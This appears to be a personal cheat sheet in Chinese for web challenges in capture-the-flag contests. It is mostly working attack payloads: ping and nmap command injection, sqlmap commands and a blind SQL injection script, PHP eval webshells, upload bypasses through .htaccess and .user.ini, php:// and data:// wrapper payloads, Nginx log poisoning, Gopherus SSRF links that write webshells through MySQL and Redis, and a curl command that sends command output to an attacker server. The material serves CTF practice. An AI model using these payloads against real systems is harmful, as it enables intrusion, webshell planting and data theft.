# Web
- 不能全信前端的代码提示
- 一个复杂的网页，页面中很可能隐藏了重要外链

## HTTP 和网页

- HTTP 会将 URL 和 Headers 自动解 urldecode，但是不会解 POST 方法内的 urldecode (其实不一定，urldecode 是由编程语言负责的，具体看怎么设定的)

### httpie

> Chrome 无法显示源码时，可直接用工具(如 httpie)请求接口

#### HTTP (GET / POST) 工具

```bash
# GET
http GET http:x?name=felord&age=18

# POST
http POST http:x name=felord age=18
```

### 前端伪造 ip

X-Forwarded-For: 127.0.0.1

有时候网站多刷新几次会有不同的发现
        
注意观察网站刷新的原因是否由 Cookie 等字段影响的？

### 网页链接提取

自动提取网页中包含的链接，并排除黑名单后缀。（用于发现复杂网页包含的重要外链信息）

```javascript
(function() {
    var allElements = Array.from(document.querySelectorAll('*'));
    var allUrls = [];
  	// 链接黑名单后缀
    var staticFileExtensions = ['jpg', 'png', 'gif', 'css', 'js'];

    allElements.forEach(function(el) {
        if (el.hasAttribute('href')) {
            allUrls.push(el.getAttribute('href'));
        }
        if (el.hasAttribute('src')) {
            allUrls.push(el.getAttribute('src'));
        }
    });

    var nonStaticUrls = allUrls.filter(function(url) {
        var extension = url.split('.').pop();
        return staticFileExtensions.indexOf(extension) === -1;
    });

    var uniqueNonStaticUrls = [...new Set(nonStaticUrls)];

    console.log(uniqueNonStaticUrls);
})();
```

## Linux

- Linux 命令绕过，可以用 | 或 & 或 ;

  在 Linux 中，`|`、`&` 和 `;` 都是常用的命令行符号，每个符号都有自己的特定用途。

  1. `|` (管道)：这个符号用于将一个命令的输出作为另一个命令的输入。例如，`command1 | command2`，这里 command1 的输出会作为 command2 的输入。

  2. `&`：这个符号用于在后台运行命令。如果你在命令后加上 `&`，那么这个命令就会在后台运行，你可以继续在命令行中输入和执行其他命令。例如，`command &`，这里 command 会在后台运行。

  3. `;`：这个符号用于在同一行中运行多个命令。命令在 `;` 后面的命令会在前一个命令执行完毕后执行，无论前一个命令是否成功。例如，`command1 ; command2`，这里 command1 会首先执行，无论其是否成功，command2 都会接着执行。

  这就是 Linux 中 `|`、`&` 和 `;` 的基本区别。

### ping 注入

注入
```bash
ping -c 4 127.0.0.1 | ls
```

& 注入
```bash
ping -c 4 127.0.0.1&ls
```

使用 base64 解码
```bash
ping -c 4 127.0.0.1&cat 7672134566268.php| base64
```

base 64 绕过复杂的正则表达式
```bash
http://xxx/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
# $IFS$ 是空格绕过
```

### nmap 注入

```bash
-iL /flag -oN flag.txt
# 执行payload，将根目录下的flag文件内容作为扫描目标，并将扫描结果重定向到flag.txt文件中
```

### 正则表达式工具
通过正则表达式来生成文本

https://onlinetexttools.com/generate-text-from-regex

正则表达式菜鸟工具

https://c.runoob.com/front-end/854/

### Linux 绕过正则表达式

#### / 被过滤

下面这条命令可以打印当前目录及子目录的所有文件内容

```bash
cat `find`
```

## 端口扫描

### nmap
> 端口扫描工具

## 文件
> 自己寻找文件时，要优先想到代码审计，查看 index.php 是什么内容

### 目录扫描

#### dirsearch
> Web 目录扫描工具
```bash
# 用法：
python3 dirsearch.py -t 100 -u https://target
python3 dirsearch.py -t 100 --include-status 200-399 -u http://xxx
```

### 文件注入

#### 中国蚁剑
```
PHP
1.编辑 PHP 文件内容:<?php eval(@$_POST['a']); ?>
2.将该文件上传到服务器(连接地址就是该文件路径，密码是上面输入的'a')
3.使用中国蚁剑连接该文件即可
```

### Git

#### 手动抓取
> 实测抓取的记录比 scrabble 完整
```bash
wget -r http://xxx/.git
```
当 git log 找不到记录时，继续进行下面步骤

查看过去误操作改变的历史记录
```bash
git reflog
```
一个版本一个版本查看变动
```bash
git show xxx
```

#### GitHack
- 通过网站中泄漏的 .git 文件克隆出项目目录
- 需要 Python 2 环境

#### scrabble
> 查询网站泄漏的 .git 文件，并将本目录还原为网站目录
使用方法
```bash
git clone https://github.com/denny0223/scrabble.git
./scrabble http://example.com/​
```
> 在 M1 Mac 中，/Users/Cyberbolt/Library/CloudStorage/OneDrive-个人/编程/CTF/工具/Git工具/scrabble 保留了副本

### Nginx

#### 目录穿越
穿越到上级目录 http://xxx/img../

 #### 富文本编辑器

#### 暴露服务端文件

在富文本编辑器中点击上传云文件或云图片时，暴露出了服务端目录。

## 密码爆破

### 弹窗式密码

这种密码往往通过 HTTP 的 Authorization 请求头发送，示例如下

```
Authorization: Basic YWRtaW46MDAwMA==
```

其中，将 `YWRtaW46MDAwMA==` 解 base64 可以得到 `admin:0000`，示例爆破代码如下

```python
import base64

import httpx


def main():
    with open('最新网站后台密码破解字典.txt', 'r') as f:
        passwords = f.read().splitlines()
    
    for password in passwords:
        headers = {
            'Authorization': 'Basic ' + base64.b64encode(('admin:' + password).encode()).decode()
        }
        print(headers)
        r = httpx.get('http://ed2d415d-caef-4a1a-b425-bc0ec7323fa3.challenge.ctf.show/', headers=headers)
        print(r.text)


if __name__ == '__main__':
    main()
```

## SQL 攻击

- 若系统不允许注册'admin'。可以在注册时加一个空格，如'admin '，登录时仍然可以用'admin'登录。原因见 [SQL 约束攻击](#SQL-约束攻击)

### SQL 注入

#### sqlmap

##### GET
```bash
# 找到注入点，如 /?id=1
# 查数据库
python sqlmap.py -u http://x.com/?id=1 --dbs
# 查 N 数据库的表名
python sqlmap.py -u http://x.com/?id=1 -D N --tables
# 查 N 数据库的A 表的列名
python sqlmap.py -u http://x.com/?id=1 -D N -T A --columns
# 查 N 数据库的 A 表的 B 列数据
python sqlmap.py -u http://x.com/?id=1  -D N -T A -C B --dump


# 高级注入（只举例第一步，同样适用于 POST 请求）
python sqlmap.py -u http://x.com/?id=1 --batch --level=3 --tamper=space2comment.py --dbs
```

##### POST
```bash
# 发送 POST 请求
python sqlmap.py -u http://x.com --data="name=a&pass=123456aaa"
# 此处的 name 和 pass 都是 POST 方法的参数
```

#### 服务端文件读取
```bash
python sqlmap.py -u http://61.147.171.105:56766/join.ok.php --data="username=a&passwd=a&age=1&blog=baidu.com" --file-read "/var/www/html/flag.php"
# 重点是 --file-read 参数
```

#### 万能密码表
> 有时候 sqlmap 无法使用，该方法可以登录进去
```url
http://xxx/?username=admin'or'1'='1&password=123456'or'1'='1
```

### SQL 约束攻击

#### 加一个空格，SQL 查询不会变
> 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。
```sql
SELECT * FROM users WHERE username='vampire     ';
```

### SQL 盲注

SQL 盲注示例代码

```python
import requests

url='http://3d4bda8e-7eef-4853-9a8d-e0057f666d26.challenge.ctf.show/admin/checklogin.php'
s='0123456789abcdefghijklmnopqrstuvwxyz'
password=''
flag=''
# 从第1位到第17位，这里已知密码是17位数
for i in range(1,18):
    print("第"+str(i)+"位")
    for j in s:
        data={"u": f"'||substr(p,{str(i)},1)<'"+j, 
              "p": "1"}

        r=requests.post(url,data=data)

        if "密码错误"==r.text:
            password+=chr(ord(j)-1)
            print(password)
            break
        
print(password)

'''
在这个脚本中，SQL注入的语句是"||substr(p,"+str(i)+",1)<'"+j，这个语句的意思是"或者密码的第i位小于当前尝试的字符j"。如果这个语句为真，那么应用程序会返回一个"密码错误"的响应。这就是这个脚本如何知道哪个字符不在密码中的。

chr(ord(j)-1) 这个表达式是在Python中对字符进行处理的一种方式。
ord(j) 是Python的内置函数，用于返回一个字符（例如 j）的Unicode编码。例如，ord('a') 返回97。
-1 是对这个Unicode编码进行减1操作，即返回前一个字符的Unicode编码。
chr() 也是Python的内置函数，用于返回指定Unicode编码的字符。例如，chr(97) 返回 'a'。
所以，chr(ord(j)-1) 这个表达式的功能是返回字符j的前一个字符。例如，如果 j 是 'b'，那么 chr(ord(j)-1) 就会返回 'a'。
'''
```



## 代码注入

- `/etc/passwd` 是一个在 Unix 和类 Unix 系统中的系统文件，用于存储所有用户的基本信息。可以用该文件来测试 Web 网站是否暴露了目录。（有时候网站暴露的目录只能用相对路径访问，如 ../../../../etc/passwd）

### PHP

- index.php 的默认路径是 /var/www/html/index.php
- 看到类似 ?id=1 的 url，无论是不是一个正常页面，可以联想到注入
- 看清楚题目是 `$_GET` 还是 `$_POST` 。提交 POST 方法时注意看参数名写好了没有
- 当 system('ls'); 被绕过时，可以用 passthru("ls"); 代替。再提供一种思路，除了用 system 外，还可以直接 show_source('flag.php')、highlight_file('flag.txt')
- 当空格和 cat 被绕过，可以用 %09 替代空格，${IFS} 也可以用于替换空格。tac 替代 cat。
- $@ 可替代空字符串，用于绕过正则
- %27%27 代表 '' 空字符串，可以绕过正则的 flag 匹配
- 如果 ; 被过滤，可以用 ?> 代替
- php 正则表达式后加一个 /i 表示大小写不敏感匹配
- 注意 include、eval、system 的区别。执行了代码记得加 ;
- 培养目录提权思维，如果一道题本身禁止访问 /flag.php，可以通过参数构造地址的方法 (类似 127.0.0.1/flag.php) 来访问。curl_setopt() 函数就类似 Python 的 requests，可以访问外部或内部地址
- SSRF
- - 如果 127.0.0.1 被过滤，可以使用 sudo.cc 替代。127.0.0.1 还可以写成 127.1    。http://0.0.0.0 可以写成 http://0
  - 如果网站使用无密码 MySQL、Redis，可以考虑用 Gopherus 实现 RCE 注入

#### PHP 绕过普通正则表达式

${IFS} 用于替换空格

$@ 替代空字符串

#### 文件漏洞

- 在做题的时候尽量多试几个题目的提示后缀​（如 index.php、source.php）

##### 上传
> 拿到 webshell
>
> 需要注意下，有时候后端是通过 HTTP Headers 的 content-type 来判断文件类型的，改了 content-type 即可绕过。（在 Brup 中，只用改 ------WebKit 下方的 content-type）遇到过一道题，上传类型必须用 image/jpeg，用 jpg 和 png 都不行。
>
> 如果看不懂前端验证，可以改成图片格式后用 Burp 传上去，再用 Reapter 将文件后缀改为 PHP 传上去
>
> 如果 [] 被过滤了，可以用 {} 替代？？

###### test.php

- 1.编辑 PHP 文件内容:
```php
<?php eval(@$_POST['a']); ?>
```
或者，用这段代码的缩减版

```php
<?= eval($_POST['a']);?>
```

- 2.将该文件上传到服务器(连接地址就是该文件路径，密码是上面输入的'a')
- 3.使用中国蚁剑连接该文件即可

(如果不成功，考虑绕过，试试 test.phtml 方法)【注意，有时候后端检测了文件中的内容，有 <? 就上传不了，可以考虑下面的方法 】

###### test.phtml

```html
<script language='php'>@eval($_POST['a']);</script>
```
###### .htaccess 防止绕过 php

如果服务端禁止上传 php，可以将 php 改为图片格式 (如 png) 欺骗服务器，再使用 .htaccess 将 png 指定为 php 文件执行。(需要注意下，传图片需要确保 HTTP Headers 的 content-type 为 image/jpeg，目前知道 .htaccess 支持 Nginx 和 Apache)

.htaccess 文件内容

```c
<FilesMatch "xin.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

然后访问上传的 php 文件即可

 ###### 更进一步的 .user.ini 绕过

首先上传 .user.ini 文件（配合 Burp 的 Reapter，把 Content-Type: application/octet-stream 修改为 Content-Type: image/jpg）

GIF89a 是图片的文件头，用于绕过服务端判断

原理：

1. .user.ini 文件：在 PHP 5.3.0 版本以后，引入了一个新的特性，用户可以在每个目录下面放置一个名为 ".user.ini" 的文件，这个文件中可以包含一些 PHP 的配置项，这些配置项会影响到当前目录以及子目录中的 PHP 执行环境。这就为我们提供了一个可能的攻击点，如果我们能够上传一个 ".user.ini" 文件，并在其中设置一些特定的配置项，那么我们就可能对服务器的 PHP 执行环境进行修改。
2. auto_prepend_file 配置项：这是 PHP 的一个配置项，它的作用是在 PHP 解析器处理每个 PHP 文件之前，都会先处理这个配置项指定的文件。也就是说，如果我们在 ".user.ini" 文件中设置了 auto_prepend_file，那么这个设置的文件会在所有的 PHP 文件之前被执行。
3. 在"a.jpg"文件的开头添加"GIF89a"头部，使得这个文件在视觉上表现为一张正常的 JPG 图像，但实际上包含了恶意的PHP代码。

【PS: macOS 的访达中按住 `command + shift + .` 显示隐藏文件】

```
GIF89a
auto_prepend_file=a.jpg
```

编辑和上传 a.jpg 文件（注意和前一步一样，Content-Type 为 image/jpg）

```php
GIF89a
<?= eval($_POST['a']);?>
```

示例上传位置为 `uploads/a.jpg`，然后用蚁剑连接 `uploads/index.php` 文件即可，密码是 `a`。

(经测试，a.jpg 必须在 .user.ini 之后上传)

##### 伪协议

###### convert.base64-encode

适用于 eval()、include()

```url
http://xxx/?p=php://filter/convert.base64-encode/resource=flag.php
```

- 更难的 (绕过 preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)))。**看到正则表达式绕过了 ; 就要联想到该方法，该方法的核心是 ?> 代替 ; ，表示接下来的语句是最后一条语句。

- ```
  http://xxx/?p=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
  # php语句中的;可以用?>代替(表示最后一个语句)
  
  # 通过使用 http://xxx/?c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php，我们可以看到这里传递给 c 变量的值是 include $_GET[1]，而 1 变量的值为 php://filter/convert.base64-encode/resource=flag.php。
  # 此时，include 语句将会加载 php://filter/convert.base64-encode/resource=flag.php 文件，并将其转换成 base64 编码形式后输出。由于此时 c 变量的值只是一个 include 语句，因此不会触发正则表达式中的任何敏感词匹配，从而成功绕过了安全措施。
  
  
  # 在此基础上，如果数字也被绕过，改为如下：
  http://xxx/?p=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
  # 这段命令正则表达式只能检测 include$_GET[a] 部分，后面的部分是传进来的
  
  # 继续 如果 < 和 > 被过滤了，再来一个无括号版的
  http://xxx/?p=include $_GET[a];&a=php://filter/read=convert.base64-encode/resource=flag.php
  ```

注释：使用 ?file=flag.php 读取文件可能会因为权限不足而无法读取到内容。因为有些 Web 服务器，如 Apache，会对目录或文件设置访问权限。如果当前用户没有足够的权限来读取 flag.php 文件，则无法读取到该文件的内容。而使用 ?file=php://filter/convert.base64-encode/resource=flag.php 可以绕过这些权限限制，因为 PHP 脚本本身具有读取文件的权限，它可以打开并读取任何一个它拥有的文件。通过将读取到的文件内容转换成 base64 编码后输出，即使该文件是二进制或包含特殊字符，也可以正确地输出文件内容，因此能够获取 flag。

###### convert.iconv.utf8.utf16

前一种方法不行的情况下，有时候该方法行得通

```
php://filter/convert.iconv.utf8.utf16/resource=flag.php
```

###### text/plain

适用于 include()

```url
http://xxx/?p=data://text/plain,<?php system("ls");?>
```

然后，使用

```
http://xxx/?p=data://text/plain,<?php system('cat flag.php');?>
```

有时候还是被过滤了，就将 <?php system('cat flag.php');?> 转为 base64:

```
http://xxx/?p=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
# 当使用数据流协议 data:// 时，可以通过 base64 编码的方式来直接传递数据，而不需要引用外部文件
```

###### 执行 system

方法一

```url
http://xxx/?page='.system("cat ./templates/flag.php").
```
方法一不行的话，用方法二
```url
?p=system('cat flag.php | base64')
```
原因：
在某些服务器上，执行 system('cat flag.php') 命令将会返回一个空字符串，而不是预期的 flag.php 文件内容。这是因为在 shell 中，管道符 | 表示将前一个命令的输出作为后一个命令的输入。由于执行 system() 函数时，标准输出通常不被捕捉，因此无法获取 cat flag.php 的输出，并且 $a 将被设置为空字符串。
相反，system('cat flag.php | base64') 命令将会将 flag.php 文件内容进行 base64 编码，然后将编码结果作为字符串返回。由于 base64 编码只使用 ASCII 字符集，可以保证其在 PHP 脚本中的可靠性，并且可以从 $a 中获取到正确的返回值。

另外的示例：

用 || 和 < 分别绕过 Linux 命令和空格。如果题目本来要执行一个 ping 或其他命令，可以这样绕过：

```
http://xxx/?c=tac<fla%27%27g.php||
# 只有当 || 左边的内容执行失败时，才会执行右边。%27%27 代表 '' 空字符串，可以绕过正则的 flag 匹配
# 等效于 ?c=tac<fla''g.php||    , Linux 在 tac 输出时会忽略 ''
```



###### GET 方法注入字符串到文件流
将字符串 hello ctf 注入文件流 file

```url
http://xxx/?file=data://text/plain,hello ctf
```

###### POST 方法注入字符串到文件流

适用于 file_get_contents()、include()

> POST 中，GET 方法的一个参数值是 php://input ，POST 中提交纯字符串可作为该参数的值（用于破解 PHP 读文件[如 file_get_contents]，此处可以自己构造文件内容）
>
> 如果小写 php 被绕过，可以用 Php://input
```
http"//xxx/?file=php://input
post data:<?php system("ls /"); ?>
# 此处的 POST 只传字符串(不是键值对)
```

##### SSI 漏洞

- 1.Web 服务器已支持SSI（服务器端包含）
- 2.Web 应用程序未对对相关SSI关键字做过滤
- 3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）

提交 POST

```
用户名 <!--#exec cmd="ls ../"-->
密码 123123 (输入正确密码)
```

##### 直接访问服务器目录

- 部分服务器会暴露本地路径，可以直接在 url 处构造路径访问

###### Nginx 日志文件，通过修改 User-Agent 执行 php 代码

如果 php://input 都被过滤，可以考虑此方法

有时候题目代码没有明示，但测试下来 system() 等这些函数都用不了，则可以尝试该方法

例如

```
访问 http://xxx/?file=/var/log/nginx/access.log
修改 User-Agent 的值为 Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) <?php system('ls');?>Gecko/20100101 Firefox/56.0 
# 此处会执行中间插入的代码 <?php system('ls');?> 。（可能要访问2次才会显示，结果可能返回在 html 源码中）
```

###### 文件协议

> 用于url是重定向的情况
```
http://xxx/?url=file:///var/www/html/flag.php
```

###### include 函数的特性

> 查找 ../../../../ffffllllaaaagggg 文件
```
http://xxx/source.php?file=hint.php?../../../../../ffffllllaaaagggg
```

#### 绕过复杂的正则表达式

> 查看 flag.php 的一种冷门方法

```
http://xxx/?p=uniq${IFS}f???.php
```

> 如 preg_match("/[A-Za-z0-9]+/",$code)

##### 取反执行某个函数
取反后 得到不可读的打印串，再将 url 编码
```php
<?php
$c='phpinfo';
$d=urlencode(~$c);
echo $d;
?>
# 返回：%8F%97%8F%96%91%99%90
```

访问 url

```
(~%8F%97%8F%96%91%99%90)();
```



##### 取反连接蚁剑

> 通过构建 assert（eval(_POST['test'])）来使蚁剑连接

```php
<?php
error_reporting(0);
$a='assert';
$b=urlencode(~$a);
echo '(~'.$b.')';
$c='(eval($_POST[1]))';
$d=urlencode(~$c);
echo '(~'.$d.')';
?>
# 得到 (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6)
```
再访问 url
```
http://xxx/code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);
```

#### 执行系统命令

##### system('ls')

再提供一种思路，除了用 system 外，还可以直接 show_source('flag.php')

如果 system('cat flag.txt') 不成功，可以尝试如 system('cat f*.txt')。（或者可以尝试直接在浏览器访问这个文件）

#### 变量漏洞

##### 超级全局变量(输出所有全局变量的值)
```
http://xxx/?p=GLOBALS
```

#### 弱类型(==判断) 
> 知识点

**比较符**
- ===比较两个变量的值和类型；==比较两个变量的值，不比较数据类型。
- 在php中,如果bool和"任何其他类型"比较,"任何其他类型"会转换为bool。
- 看到类似 if(intval($num)) 要联想到弱类型，通过数组绕过。（数组同时可以绕过正则表达式）
- 447.0 和 447 用 === 比较的时候不相等
##### MD5 绕过
举例（以下几个字符串可绕过弱类型 md5）
```
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a

原理：
在 PHP 中，'0e' 开头的字符串会被当作科学计数法来处理，因此当两个不同的字符串的 md5 哈希值以 '0e' 开头并且后面都是数字时，这两个哈希值在 PHP 中会被当作相等。
在这个例子中，我们需要找到两个字符串，一个只包含字母，一个只包含数字，它们的 md5 哈希值相等。
这样的字符串对已经被找到了，比如 '240610708' 和 'QNKCDZO'。这两个字符串的 md5 哈希值都是 '0e462097431906509019562988736854'。
```
如果前一种方法不行，利用 md5 无法处理数组的特性绕过。(sha1 也无法处理数组类型，也适用此方法)
```
http://xxx/?v1[]=1&v2[]=2
```

##### 弱类型 if 绕过
下面的代码示例结果输出 1
```php
<?php 
$x=5;
$y="5s";
if ($x == $y) {
    echo 1;
}
?>
```

下面的代码示例结果输出 1

```php
<?php
    echo "字符串"==0;
?>
```

解释：在 PHP 中，当你试图将一个字符串和一个数字进行比较时，PHP 会尝试将这个字符串转换为一个数字。在这种情况下，PHP 会从字符串的开始处读取，直到它找到一个不能被解析为数字的字符，然后它只会返回已经解析的部分。如果字符串的开始部分没有数字，那么它将返回 0。

在你提供的代码中，"字符串" 是一个完全由非数字字符组成的字符串，所以当 PHP 尝试将它转换为数字时，它将返回 0。因此，"字符串"==0 的结果是 true，也就是 1。

这是 PHP 的类型松散比较的一个特性。如果你想进行严格的类型比较，你应该使用 === 操作符，这样除了值要相等，类型也要相等，"字符串"===0 将返回 false。

##### if(!$_GET['id']) 绕过

某个 GET 参数例如 id 的值为 0，在 PHP 中，!$_GET['id'] 该判断是 true。要绕过该判断，使用 id=0a 即可
>”1aaaa“=="1"是成立的，因为数字和字母不可比较，只要字母前面的数字全一样就可以
>
>但是，如果是 "aaaa1"=="1" 就不成立，字母在前时，会被识别为非数值类型，返回 0

举例
```
if(!$_GET['id']) 是弱比较
if($_GET['id'] === null) 是强比较
```

##### SQL 注入的弱类型绕过

```
http://xxx/?id=2 or id =1000
# 用于绕过弱类型比较时，id 只能小于 1000 的情况

# 继续 如果 or 也被绕过，使用 ||
http://xxx/?id=2||id=1000
或者 取反
http://xxx/?id=~~1000
# 取反操作时，intval('~~1000') 会将值转为 0，所以可以绕过 if(intval($id) > 999)
```

继续上面的类型，如果连取反 ~ 也被绕过，则用以下脚本转为二进制解题

```python
def main():
    a = 1000
    print(bin(a))
    

if __name__ == '__main__':
    main()
    

# # 获取用户输入十进制数
# dec = int(input("输入数字："))
 
# print("十进制数为：", dec)
# print("转换为二进制为：", bin(dec))
# print("转换为八进制为：", oct(dec))
# print("转换为十六进制为：", hex(dec))
```

得到以下 url

```
http://xxx/?id=0b1111101000
# 0b1111101000 是 1000 的二进制
# 说明数据库会自动将二进制转为十进制？
```

#### 反序列化

- PHP 的反序列化和 Python 有很大区别。PHP 中只能根据原本模版 (class) 来改，只能改变属性值，不能修改方法 (只能修改构造方法)。PHP 的序列化更像是在前端构建和后端相匹配的数据结构。

- 反序列化也支持反序列化字符串。
- PHP 的序列化过程会产生特殊字符（如 %00），如果将序列化结果复制到在线的 base64 网站进行编码可能就会丢掉特殊字符，所以最好直接在 PHP 中进行 base64 或其他一系列编码。

- PHP 中类属性只能是 字符串、数值或 bool，只能在外部用 -> 指向其他类型（如函数）

- w00m->{a}: 表示调用 w00m 对象的 a 方法，a 是方法名的字符串

- 一个 CVE 漏洞 ：当成员属性数目大于实际数目时可绕过 __wakeup 方法(CVE-2016-7124)

  举例：将实际生成的序列化字符串 `O:4:"xctf":1:{s:4:"flag";s:3:"111";}` 改为 `O:4:"xctf":2:{s:4:"flag";s:3:"111";}` 即可绕过 __wakeup()

反序列化代码示例

```php
<?php
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=true;
}

$ctfs = new ctfShowUser();
echo urlencode(serialize($ctfs));
?>

// 最后输出时最好使用 urlencode 编码，避免不合规字符串，Cookie 中的 url 编码会被 HTTP 自动解码
```

##### 反序列化正则绕过

###### 正则匹配 "o" 或 "c" 

将 O:4 改为 O:+4

举例

```php
if (preg_match('/[oc]:\d+:/i', $var))
```

得到的序列化字符串为

```bash
O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
```

将它改为

```bash
O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
```

#### Gopher 注入 RCE 漏洞

- 核心是后台可以请求 url 链接，在这里使用 Gopher 注入代码
- 已经安装在 pt-ctf 的 Docker 容器中

##### 打无密码 MySQL

```bash
gopherus --exploit mysql
```

输入 username 为 root

输入 execute 为

```sql
select "<?php @eval($_POST['test']);?>" into outfile '/var/www/html/2.php';
```

得到

```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4c%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%74%65%73%74%27%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01
```

由于有不允许的字段，用 url 编码后面的内容得到

```
gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2574%2565%2573%2574%2527%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501
```

通过 Brup 的 Reapter 将 这段内容注入到服务器后端请求 url 的位置，即可正常使用蚁剑连接

##### 打 Redis

```bash
gopherus --exploit redis
```

根据提示输入即可，和上面的打 MySQL 差不多，其中我选的 phpshell，没有选反弹 shell，只是 PHP 注入内容输入

```php
<?php @eval($_POST['test']);?>
```

 然后通过默认生成的 shell.php 实现蚁剑连接

##### 备忘 GitHub 的示例

- MySQL：如果用户没有密码保护，你可以转储他的数据库，也可以在他的系统中放置恶意文件。

```
gopherus --exploit mysql
```

   它只询问 MySQL 用户的用户名，它会为您提供 gopher 链接。

- PostgreSQL：如果用户没有密码保护，你可以转储他的数据库，也可以将恶意文件放入他的系统。

```
gopherus --exploit postgresql
```

   它只询问 Postgres 用户的用户名和数据库名称，然后它会为您提供 gopher 链接。

- FastCGI：如果端口 9000 在没有安全保护的情况下打开，那么您可以获得 RCE。

```
gopherus --exploit fastcgi
```

   它只要求一个必须存在于受害者系统中的文件（最好是 .php 文件），顺便说一句，我们有默认文件。

- Redis：如果redis端口是开放的，那么我们可以覆盖系统中的文件，这太危险了。
  所以这里有两件事你可以得到：
  a。反向 Shell
  b. PHP外壳

```
gopherus --exploit redis
```

- Zabbix：如果端口 10050 处于打开状态，`EnableRemoteCommands = 1`那么您可以在受害系统上运行 shell 命令。

```
gopherus --exploit zabbix
```

- Memcached：它主要用于存储序列化数据，但是当涉及到对这些数据进行反序列化时，就会出现已知的漏洞，例如 PHP 反序列化问题、Python-Pickle 反序列化问题、Ruby-Marshal 反序列化问题这可能导致 RCE。
  因此，我为它们中的每一个创建了不同的脚本，还创建了一个用于转储 Memcached 内容的脚本：

```
gopherus --exploit pymemcache
gopherus --exploit rbmemcache
gopherus --exploit phpmemcache
gopherus --exploit dmpmemcache
```

- SMTP：如果端口 25 是开放的，那么我们可以访问它，我们可以作为受害者用户向任何人发送消息，所以这个工具会生成用于发送邮件的 gopher payload。

```
gopherus --exploit smtp
```



#### 反弹 shell

在攻击服务器上执行（如果使用的是公网，建议用搬瓦工服务器）

```bash
nc -nlvp 10200
```

监听 0.0.0.0 的 10200 端口

找到靶机上可以请求 url 的注入点

```
?url=https://;curl http://攻击服务器地址:4567?`ls`
# 前面的 https 是一道题中的条件，这里用了绕过 https

# 通用写法如下
?url=http://攻击服务器地址:4567?`ls`

# 经过测试，该方法每次请求，都需要重启攻击服务器上的 tcp 连接，才能在下次请求正常收到信息
```

如果输出内容被后端限制了长度，可以这样测试 flag 的路径:

```
ls
ls /f*
cat /f*
```





#### 特殊函数的漏洞

##### strcmp
> 不支持数组，遇到数组会直接返回0
```
?id[]=1
```

#### 函数或语法备忘

- 如果遇到函数不认识，可以在本地用 php 执行一下，看看效果。

##### 弱类型语言

在PHP中，当字符串被用在数学运算中时，PHP会自动将其转换为数值。

##### PHP 的数组可以和键值对很像

在PHP中，数组是一个复杂的数据结构，它可以存储多种类型的数据并且可以通过键值对的方式进行访问。这是因为PHP的数组实际上是一个有序映射。映射是把键（key）和值（value）关联在一起的一种数据类型。

